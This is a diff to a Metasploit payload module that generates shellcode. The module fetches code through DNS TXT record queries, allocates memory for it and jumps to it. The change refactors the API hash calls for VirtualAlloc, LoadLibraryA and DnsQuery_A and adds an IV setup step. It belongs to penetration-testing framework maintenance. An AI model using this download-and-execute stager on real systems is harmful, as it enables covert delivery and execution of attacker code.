@@ -67,6 +67,7 @@ module MetasploitModule
   # c.corelan.eu  : contains the last 144 bytes of the alpha shellcode
 
   def generate(_opts = {})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     dnsname = datastore['DNSZONE']
     w_type = 0x0010 # DNS_TYPE_TEXT (TEXT)
     w_type_offset = 0x1c
@@ -96,7 +97,7 @@ module MetasploitModule
       push eax                ; flAllocationType MEM_COMMIT (0x1000)
       push eax                ; dwSize (0x1000)
       push 0x0                ; lpAddress
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp
       push eax                ; save pointer on stack, will be used in memcpy
       mov #{bufferreg}, eax   ; save pointer, to jump to at the end
@@ -110,7 +111,7 @@ module MetasploitModule
       push eax                ; push 'dnsapi' to the stack
       push 0x61736e64         ; ...
       push esp                ; Push a pointer to the 'dnsapi' string on the stack.
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+      push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
       call ebp                ; LoadLibraryA( "dnsapi" )
 
     ;prepare for loop of queries
@@ -133,7 +134,7 @@ module MetasploitModule
       push #{queryoptions}    ; Options
       push #{w_type}          ; wType
       push eax                ; lpstrName
-      push #{Rex::Text.block_api_hash('dnsapi.dll', 'DnsQuery_A')}
+      push #{block_api_hash('dnsapi.dll', 'DnsQuery_A')}
       call ebp                ;
       test eax, eax           ; query ok?
       jnz jump_to_payload     ; no, jump to payload
